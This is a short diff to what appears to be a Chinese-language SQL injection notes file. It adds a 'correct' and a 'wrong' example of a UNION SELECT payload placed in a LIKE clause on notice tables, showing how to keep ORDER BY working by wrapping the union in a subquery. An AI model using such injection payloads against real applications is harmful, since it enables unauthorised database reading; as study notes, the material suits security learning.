@@ -542,3 +542,12 @@ SELECT * FROM information_schema.SCHEMATA AS s LEFT JOIN test.user AS u ON s.SQL
 
 
 
+* 复杂语句order by无法突破
+
+```sql
+# 正确
+SELECT * FROM (SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS u ON   n.notice_id=u.relatin_notice_id WHERE  n.title LIKE '%%' union select 1,2,3,4,5,6,7,8 AS type_id,9,10,11,12,13,14 FROM aoa_notice_list AS n)AS n ORDER BY  n.type_id DESC 
+# 错误,n.type_id不对
+SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS u ON   n.notice_id=u.relatin_notice_id WHERE  n.title LIKE '%%' union select 1,2,3,4,5,6,7,8 AS type_id,9,10,11,12,13,14 FROM aoa_notice_list AS n ORDER BY  n.type_id DESC 
+```
+
